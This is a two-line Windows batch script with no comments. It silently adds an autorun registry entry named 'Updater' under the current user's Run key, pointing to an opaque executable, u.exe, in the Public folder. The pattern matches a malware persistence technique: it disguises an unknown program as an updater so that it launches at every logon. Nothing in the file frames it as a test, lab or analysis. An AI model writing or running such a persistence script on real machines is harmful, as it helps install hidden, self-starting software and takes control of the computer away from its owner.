@echo off
reg add "HKCU\Software\Microsoft\Windows\CurrentVersion\Run" /v Updater /d C:\Users\Public\u.exe
